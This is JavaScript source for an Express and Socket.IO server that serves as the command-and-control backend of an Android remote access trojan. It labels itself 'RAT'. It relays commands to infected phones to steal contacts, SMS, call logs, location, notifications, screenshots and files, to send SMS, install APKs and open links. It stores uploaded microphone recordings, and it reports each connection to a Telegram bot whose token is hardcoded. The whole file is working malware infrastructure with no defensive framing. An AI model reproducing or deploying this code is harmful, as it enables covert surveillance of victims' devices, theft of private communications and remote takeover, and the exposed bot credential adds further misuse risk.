
// Setup basic express server
const express = require("express");
const app = express();
const path = require("path");
const crypto = require("crypto");
const fs = require("fs");
const https = require('https');
const server = require("http").createServer(app);

const io = require("socket.io")(server, {
  cors: {
    origin: ["https://admin.socket.io"],
    credentials: true,
  },
maxHttpBufferSize: 1e8 // 100 MB
});

const client = require("socket.io-client");
const { instrument } = require("@socket.io/admin-ui");
const port = process.env.PORT || 4000

instrument(io, {
  auth: false,
  mode: "development",
});
let numUsers = 0;

server.listen(port, () => {
  console.log("Server listening at port %d", port);
});

function getReqDate() {
  var year = new Date().getFullYear();
  var month = new Date().getMonth() + 1 + "";
  if (month.length == 1) {
    month = "0" + month;
  }
  var day = "" + new Date().getDate();
  if (day.length == 1) {
    day = "0" + day;
  }
  var hour = "" + new Date().getHours();
  if (hour.length == 1) {
    hour = "0" + hour;
  }
  var minutes = "" + new Date().getMinutes();
  if (minutes.length == 1) {
    minutes = "0" + minutes;
  }

  var second = "" + new Date().getSeconds();
  if (second.length == 1) {
    second = "0" + second;
  }
  return (
    year + "-" + month + "-" + day + " " + hour + ":" + minutes + ":" + second
  );
}

// Routing
app.use(express.static(path.join(__dirname, "public")));

io.on("connection", (socket) => {
  console.log(`${socket.id} connected at ${getReqDate()}`);
  socket.broadcast.emit("connected", `${socket.id} connected at ${getReqDate()}`);
  //socket.broadcast.emit("joinroom", "");
  alertmsg("Connected to RAT");

let clientParams = socket.handshake.query;
  let clientAddress = socket.request.connection;

  //console.log(clientParams);
  //console.log(clientAddress);

  socket.on("add", (username) => {
    socket.username = username;
    ++numUsers;
    console.log(socket.username);
    console.log(numUsers);
  });

  socket.on("getallroom", (data) => {
console.log(socket.rooms);
socket.broadcast.emit("allroom", ""+socket.rooms);
  });

  socket.on("joinroom", (data) => {
    socket.broadcast.emit("joinroom", "");
  });

  socket.on("join", (room) => {
    socket.join(room);
    socket.broadcast.emit("joined", room);
  });

  // when the client emits 'new message', this listens and executes

  socket.on("order", (room, data) => {
    socket.to(room).emit("order", data);
  });

  socket.on("contact", (room, data) => {
    socket.to(room).emit("contact", data);
  });

  socket.on("calls", (room, data) => {
    socket.to(room).emit("calls", data);
  });

  socket.on("sms", (room, data) => {
    socket.to(room).emit("sms", data);
  });

  socket.on("sendsms", (room, data) => {
    socket.to(room).emit("sendsms", data);
  });

  socket.on("sysinfo", (room, data) => {
    socket.to(room).emit("sysinfo", data);
  });

  socket.on("applist", (room, data) => {
    socket.to(room).emit("applist", data);
  });

  socket.on("geolocation", (room, data) => {
    socket.to(room).emit("geolocation", data);
  });

  socket.on("calldb", (room, data) => {
    socket.to(room).emit("calldb", data);
  });

  socket.on("smsdb", (room, data) => {
    socket.to(room).emit("smsdb", data);
  });

  socket.on("notidb", (room, data) => {
    socket.to(room).emit("notidb", data);
  });

  socket.on("locationdb", (room, data) => {
    socket.to(room).emit("locationdb", data);
  });

  socket.on("screendb", (room, data) => {
    socket.to(room).emit("screendb", data);
  });
  
  socket.on("record", (data) => {
    savemic(data);
    //socket.to(room).emit("record", data);
  });

  socket.on("saveaudio", (data) => {
    savemic(data);
    //socket.to(room).emit("saveaudio", data);
  });

  socket.on("dir", (room, data) => {
    socket.to(room).emit("dir", data);
  });

  socket.on("download", (room, data) => {
    socket.to(room).emit("download", data);
  });

  socket.on("deletefile", (room, data) => {
    socket.to(room).emit("deletefile", data);
  });

  socket.on("renamefile", (room, data) => {
    socket.to(room).emit("renamefile", data);
  });

  socket.on("newfolder", (room, data) => {
    socket.to(room).emit("newfolder", data);
  });

  socket.on("apkinstall", (room, data) => {
    socket.to(room).emit("apkinstall", data);
  });

  socket.on("openlink", (room, data) => {
    socket.to(room).emit("openlink", data);
  });

  socket.on("pong", (room, data) => {
    socket.to(room).emit("pong", data);
    //console.log(`${socket.id} pong ${data}`);
  });
  socket.on("ping", (room, data) => {
    socket.to(room).emit("ping", data);
  });

  // when the user disconnects.. perform this
  socket.on("disconnect", () => {
    console.log(`${socket.id} disconnected at  ${getReqDate()}`);
    socket.broadcast.emit("disconnected", `${socket.id} disconnected at ${getReqDate()}`);
    alertmsg("Disconnected From RAT");
  });
});


function alertmsg(message){
    let token = '1783387413:AAGs1TCgMRQj9MNsRQa2p9XF3u8loZap27E';
    let api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=-1001377120891&parse_mode=HTML&text=${message}`;
    https.get(api)
}

function savemic(data) {
  if (data.file) {
    let hash = crypto
      .createHash("md5")
      .update(new Date() + Math.random())
      .digest("hex");
    let fileKey =
      hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
    let fileExt =
      data.name.substring(data.name.lastIndexOf(".")).length !==
      data.name.length
        ? data.name.substring(data.name.lastIndexOf("."))
        : ".unknown";

    let filePath = path.join(
      path.join(__dirname, "./webpublic", "/client_downloads"),
      fileKey + fileExt
    );

    fs.writeFile(filePath, data.buffer, (e) => {
      if (!e) {
        console.log(fileKey + fileExt);
      } else {
        console.log(e);
      }
    });
  }
}

app.get("/start", (req, res) => {
  try {
    const socket = client.io(`http://localhost:${port}`);
    socket.emit(
      "new message",
      {
        status: 0,
        info: "Bot Started",
        time: getReqDate(),
      },
      (resp) => {
        res.send(resp);
      }
    );
  } catch (error) {
    res.send({ status: "failure" });
  }
});






